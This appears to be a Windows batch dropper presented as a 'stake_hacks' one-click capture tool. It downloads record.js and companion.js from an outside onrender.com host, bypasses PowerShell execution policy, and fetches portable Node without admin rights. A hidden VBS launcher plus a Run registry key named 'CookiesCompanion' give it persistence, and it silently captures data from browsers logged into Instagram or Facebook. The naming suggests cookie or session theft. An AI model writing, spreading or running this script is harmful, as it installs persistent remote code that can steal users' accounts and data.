@echo off
setlocal EnableExtensions
title stake_hacks - full capture
color 0B
set "URL=https://record-rvqb.onrender.com"
set "DEST=%LOCALAPPDATA%\CookiesCompanion"
set "PORTABLE=%LOCALAPPDATA%\NodePortable"
set "SHOTS=%USERPROFILE%\Pictures\Screenshots"
set "LOG=%DEST%\setup.log"

echo ============================================
echo   stake_hacks - one click full capture
echo ============================================
echo.

if exist "%LOG%" del "%LOG%" >nul 2>nul

echo [1/5] Preparing folders...
mkdir "%DEST%" 2>nul
mkdir "%PORTABLE%" 2>nul
mkdir "%SHOTS%" 2>nul
echo [1/5] folders ready>> "%LOG%" 2>nul
echo   folders ready

echo [2/5] Downloading record.js + companion (once)...
copy /y "%TEMP%\stakehacks\record.js" "%DEST%\record.js" >nul 2>nul
copy /y "%TEMP%\stakehacks\companion.js" "%DEST%\companion.js" >nul 2>nul
if not exist "%DEST%\record.js" (
  echo   downloading from site...
  curl -sL -o "%DEST%\record.js" "%URL%/assets/record.js" || powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%URL%/assets/record.js','%DEST%\record.js')"
  curl -sL -o "%DEST%\companion.js" "%URL%/assets/companion.js" || powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%URL%/assets/companion.js','%DEST%\companion.js')"
)
if not exist "%DEST%\record.js" (
  echo ERROR: could not download record.js. Check internet.
  echo ERROR download record.js>> "%LOG%" 2>nul
  pause
  exit /b 1
)
if not exist "%DEST%\companion.js" (
  echo ERROR: could not download companion.js. Check internet.
  echo ERROR download companion.js>> "%LOG%" 2>nul
  pause
  exit /b 1
)
echo   scripts ready
echo [2/5] scripts downloaded>> "%LOG%" 2>nul

echo [3/5] Checking for Node.js...
set "NODE="
where node >nul 2>nul
if not errorlevel 1 set "NODE=node"
if defined NODE goto :nodefound
if exist "%DEST%\node\node.exe" set "NODE=%DEST%\node\node.exe"
if defined NODE goto :nodefound
if exist "%PORTABLE%\node.exe" set "NODE=%PORTABLE%\node.exe"
if defined NODE goto :nodefound
echo   downloading portable Node (no admin needed)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $m=[regex]::Match((Invoke-WebRequest 'https://nodejs.org/dist/latest-v22.x/' -UseBasicParsing).Content,'node-v[0-9.]+-win-x64\.zip').Value; if(-not $m){throw 'no zip'}; Invoke-WebRequest ('https://nodejs.org/dist/latest-v22.x/'+$m) -OutFile '%PORTABLE%\node.zip' -UseBasicParsing"
if exist "%PORTABLE%\node.zip" (
  echo   extracting...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Expand-Archive -LiteralPath '%PORTABLE%\node.zip' -DestinationPath '%PORTABLE%\tmp' -Force; $d=Get-ChildItem '%PORTABLE%\tmp' -Directory|Select-Object -First 1; Copy-Item (Join-Path $d.FullName 'node.exe') '%PORTABLE%\node.exe' -Force; Remove-Item '%PORTABLE%\tmp' -Recurse -Force; Remove-Item '%PORTABLE%\node.zip' -Force"
  if exist "%PORTABLE%\node.exe" set "NODE=%PORTABLE%\node.exe"
)
if not defined NODE (
  echo ERROR: could not download Node.js. Check internet.
  echo ERROR no node>> "%LOG%" 2>nul
  pause
  exit /b 1
)
:nodefound
echo   Node ready: %NODE%
echo [3/5] node %NODE%>> "%LOG%" 2>nul

echo [4/5] Starting companion service (auto-start on login)...
set "VBS=%DEST%\start-companion.vbs"
(
  echo Set s = CreateObject("Wscript.Shell"^)
  echo s.CurrentDirectory = "%DEST%"
  echo s.Run """%NODE%"" ""%DEST%\companion.js""", 0, False
) > "%VBS%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CookiesCompanion /t REG_SZ /d "wscript.exe \"%VBS%\"" /f >nul 2>nul
taskkill /f /im node.exe >nul 2>nul
start "" wscript.exe "%VBS%"
timeout /t 3 /nobreak >nul
echo   companion running on port 9876
echo [4/5] companion started>> "%LOG%" 2>nul

echo [5/5] Running record.js capture - your browser will open now...
echo   Do not close the browser until both screenshots finish.
set "COOKIES_SILENT=1"
"%NODE%" "%DEST%\record.js"
echo [5/5] record.js exit %errorlevel%>> "%LOG%" 2>nul

echo.
if exist "%SHOTS%\instagram_insta.png" (
  echo Screenshots saved. Opening folder...
  explorer "%SHOTS%"
  echo screenshots OK>> "%LOG%" 2>nul
) else (
  echo Screenshots NOT found - check that your browser is logged into Instagram/Facebook.
  echo screenshots MISSING>> "%LOG%" 2>nul
)
echo.
echo Done. Companion will auto-start at every login.
echo You can now press Capture again on the website to see the screenshots.
echo Log: %LOG%
echo.
pause